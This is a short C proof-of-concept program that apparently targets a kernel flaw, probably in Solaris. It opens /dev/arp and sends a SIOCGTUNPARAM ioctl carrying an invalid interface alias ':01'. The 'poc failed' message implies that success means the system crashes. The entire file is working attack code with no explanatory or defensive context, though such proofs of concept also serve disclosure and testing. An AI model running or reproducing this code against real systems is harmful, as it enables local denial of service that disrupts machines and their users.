#include <stdio.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/sockio.h>
#include <net/if.h>

int
main (void)
{
	int		fd  = 0;
	char	data[32];

	fd = open ("/dev/arp", O_RDWR);

	if (fd < 0) {
		perror ("open");
		return 1;
	}

	// IOCTL data (interface name with invalid alias ":01")
	data[0] = 0x3a; // colon
	data[1] = 0x30; // ASCII zero
	data[2] = 0x31; // digit 1
	data[3] = 0x00; // NULL termination

	// IOCTL call
	syscall (SYS_ioctl, fd, SIOCGTUNPARAM, data);

	printf ("poc failed\n");
	close (fd);

	return 0;
}